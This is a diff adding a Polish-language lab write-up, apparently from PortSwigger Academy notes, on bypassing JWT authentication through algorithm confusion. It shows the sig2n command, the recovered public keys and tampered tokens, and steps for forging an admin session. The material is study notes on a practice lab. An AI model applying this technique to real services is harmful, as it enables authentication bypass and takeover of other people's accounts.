@@ -754,5 +754,26 @@ Wtedy może pojawić się sytuacja, w której podamy JWT podpisane kluczem publi
 8. Podpisujemy wcześniej wygenerowanym kluczem symetrycznym
 9. Logujemy się na konto administratora przy pomocy gotowego JWT
 
+## Lab: JWT authentication bypass via algorithm confusion with no exposed key
+Zadanie bliźnieacze do poprzedniego, ale klucz nie jest publiczny.
+1. Logujemy się na konto, zdobywamy pierwsze JWT i je zapisujemy.
+2. Wylogowujemy się i logujemy się ponownie zdobywając drugie JWT.
+3. Za pomocą programu sig2n dodając jako atgumenty dwa znalezione JWT dostajemy potencjalne klucze wraz z podpisanymi payloadami.
+Komenda:
+```
+docker run --rm -it portswigger/sig2n <token1> <token2>
+```
+Wynik:
+```
+Found n with multiplier 1:
 
+    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzN1dmSGpsaWxJQUo4U3h2Z2FDOQpDK0VhSDF0RG1PYVV3V2hWSDJibUV1eE1RVFpFSEZPSWl1S2pYbU1TeFU0UzR6T0JDQVM0VnRuTGFrYnlBVVNaCk40Wmg0d2RNa1BTdDlkNDEzdnpwSFVtR2p2TTNRdGZ6d3lEb3dVQlVWa0pGWFFKN1FmZmE5NTNMZjdNYndTbkYKYklUOFN2UDdLcVF3c1hzZ1VHWnRqdnFIMkFGVXZtRlJ4TjIzRjdrRU9LdXdjYW1Bbk9LZFN5aGRSai9iSFhmWgpUY0k2VERZcjE3M1dxWlVxT2RQYlpCczNMdFdleGNiSmc1N0xHQyt0SWttRXFzZ2g5U0NhMEFOc2RtcXJQTTNnCjA3OThXMmpydWNJTnV1UGZod0pvampKTlhYTjZpeXh4RFZhV0kwT0RURGpnaTl2OVR5WmFWSUo5UmxEbmFnQzUKbVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+    Tampered JWT: eyJraWQiOiJjMjk5ZDI5My1hY2M4LTQ3MmEtOTJmNy1hNTczN2NiOTE3YjciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU5MDg2ODAzfQ.a8ktS-l3ELClexT94CIbrgjeop8nWC066vLxQX-fxy8
+
+    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQTM3V2ZIamxpbElBSjhTeHZnYUM5QytFYUgxdERtT2FVd1doVkgyYm1FdXhNUVRaRUhGT0kKaXVLalhtTVN4VTRTNHpPQkNBUzRWdG5MYWtieUFVU1pONFpoNHdkTWtQU3Q5ZDQxM3Z6cEhVbUdqdk0zUXRmegp3eURvd1VCVVZrSkZYUUo3UWZmYTk1M0xmN01id1NuRmJJVDhTdlA3S3FRd3NYc2dVR1p0anZxSDJBRlV2bUZSCnhOMjNGN2tFT0t1d2NhbUFuT0tkU3loZFJqL2JIWGZaVGNJNlREWXIxNzNXcVpVcU9kUGJaQnMzTHRXZXhjYkoKZzU3TEdDK3RJa21FcXNnaDlTQ2EwQU5zZG1xclBNM2cwNzk4VzJqcnVjSU51dVBmaHdKb2pqSk5YWE42aXl4eApEVmFXSTBPRFREamdpOXY5VHlaYVZJSjlSbERuYWdDNW1RSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
+    Tampered JWT: eyJraWQiOiJjMjk5ZDI5My1hY2M4LTQ3MmEtOTJmNy1hNTczN2NiOTE3YjciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjU5MDg2ODAzfQ.DJ5Il_4jNK3qQzASdrL00XklXNfYKkdpUIB7wPl4o9k
+
+```
+4. Sprawdzamy payloady, jeden z nich zosatnie przyjęty przez serwer.
+5. Kobiujemy zatem zdobyty klucz i robimy to samo co od punku 6 w poprzednim zadaniu.
 
